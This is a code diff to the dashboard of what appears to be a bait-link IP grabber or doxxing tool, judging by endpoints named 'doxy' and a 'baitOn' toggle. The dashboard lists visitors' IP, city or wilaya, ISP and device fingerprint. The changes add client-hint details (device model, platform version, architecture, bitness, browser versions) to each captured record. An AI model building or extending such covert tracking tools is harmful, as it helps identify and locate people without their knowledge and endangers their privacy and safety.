@@ -90,7 +90,7 @@ a.maps{color:#5ea9e6}
 
   <table id="tbl">
     <thead><tr>
-      <th onclick="sort('t')">Heure ▾</th>
+      <th onclick="sort('ts')">Heure ▾</th>
       <th onclick="sort('ip')">IP</th>
       <th>Ville / Wilaya</th>
       <th>FAI</th>
@@ -106,7 +106,7 @@ a.maps{color:#5ea9e6}
 
 <script>
 const DOXY='/api/v1/doxy', DATA='/api/v1/dataview', PAGE='/api/v1/page';
-let list=[], opened=null, curSort='t', asc=false, baitOn=false;
+let list=[], opened=null, curSort='ts', asc=false, baitOn=false;
 
 async function P(u,o){try{const r=await fetch(u,o);return r.ok&&r.status!==204?await r.json():null}catch(e){return null}}
 
@@ -138,7 +138,7 @@ function geoTxt(s){
 }
 function ispTxt(s){const g=s.geo||{};return g.isp||g.org||'—'}
 function devTxt(s){
-  const m=s.y||s.br||s.u||'—';
+  const m=s.hm||s.y||s.br||s.u||'—';
   return m.length>34?m.slice(0,34)+'…':m;
 }
 function precS(s){
@@ -155,11 +155,11 @@ function render(){
   arr.sort((a,b)=>{const x=curSort==='dev'?(devTxt(a)+'').toLowerCase():String(sel(a,curSort)||''),y=curSort==='dev'?(devTxt(b)+'').toLowerCase():String(sel(b,curSort)||'');return asc?x.localeCompare(y):y.localeCompare(x)});
   document.getElementById('rows').innerHTML=arr.map(s=>rowHtml(s,s.x===opened)).join('');
 }
-function sel(s,k){return s[k]}
+function sel(s,k){return k==='ts'?(s.ts||s.t):s[k]}
 
 function rowHtml(s,open){
   return `<tr class="row ${open?'open':''}" onclick="toggle('${s.x}')">
-    <td>${fmtT(s.t)}</td>
+    <td>${fmtT(s.ts||s.t)}</td>
     <td>${s.ip||'—'}</td>
     <td>${geoTxt(s)}</td>
     <td>${ispTxt(s)}</td>
@@ -197,6 +197,12 @@ function detailHtml(s){
     <div class="kv">
       ${fld('modele',s.y)}
       ${fld('android',s.av)}
+      ${fld('modele (hints)',s.hm)}
+      ${fld('android (hints)',s.pv)}
+      ${fld('arch',s.arch)}
+      ${fld('bits',s.bits)}
+      ${fld('mobile',s.mob)}
+      ${fld('navigateurs (hints)',s.fv)}
       ${fld('navigateur',s.br)}
       ${fld('gpu',s.g)}
       ${fld('gpu vendor',s.n2)}
